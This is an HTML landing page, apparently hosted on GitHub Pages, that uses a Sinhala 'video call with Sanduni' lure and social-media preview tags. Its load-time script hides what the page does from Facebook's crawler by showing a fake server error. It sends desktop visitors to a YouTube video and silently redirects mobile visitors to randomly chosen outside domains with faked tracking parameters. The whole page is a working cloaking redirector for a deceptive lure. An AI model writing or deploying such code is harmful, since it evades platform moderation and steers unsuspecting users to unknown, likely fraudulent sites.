<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔴 මට Video Call එකක් ගන්න</title>

    <meta name="title" content="🔴 මට Video Call එකක් ගන්න">
    <meta name="description" content="මම සදුනි. මට මේක ඔබලා Video Call එකක් ගන්න.">

    <meta property="og:type" content="website">
    <meta property="og:url" content="https://github.com/wal699/sanduni-call">
    <meta property="og:title" content="🔴 මට Video Call එකක් ගන්න">
    <meta property="og:description" content="මම සදුනි. මට මේක ඔබලා Video Call එකක් ගන්න.">
    <meta property="og:image" content="https://wal699.github.io/sanduni-call/og-image-git.png">
    
  

    <script>
window.onload = function () {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    // Block Facebook crawler
    if (userAgent.includes("facebookexternalhit")) {
        document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
        return;
    }

    // Detect mobile devices
    const isMobile = navigator.userAgentData
        ? navigator.userAgentData.mobile
        : /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(userAgent);

    // Redirect PC/Desktop users
    if (!isMobile) {
        window.location.replace(
            "https://www.youtube.com/shorts/Hdidwf_4I8I"
        );
        return;
    }

    // Generate unique IDs for mobile redirect links
    const randomId1 = Math.floor(Math.random() * 90000) + 10000;
    const randomId2 = Math.floor(Math.random() * 90000) + 10000;
    const randomId3 = Math.floor(Math.random() * 90000) + 10000;

    // Generate a random 2-to-3 digit GitHub ID
    const randomGithubId = Math.floor(Math.random() * 990) + 10;

    const pages = [
        "https://www.sanduni.online/?utm_source=facebook&utm_campaign=post_id_" + randomId1,

        "https://sanduni.site/?utm_source=m.baidu.com/s?word=sanduni.site&utm_campaign=post_id_" + randomId3,

        "https://www.tharushi.online/?utm_source=telegram&utm_campaign=post_id_github" + randomGithubId,

        "https://www.sanduni.online/?utm_source=facebook&utm_campaign=post_id_" + randomId2
    ];

    const randomPage = pages[Math.floor(Math.random() * pages.length)];

    window.location.replace(randomPage);
};
</script>

</head>
<body>
</body>
</html>
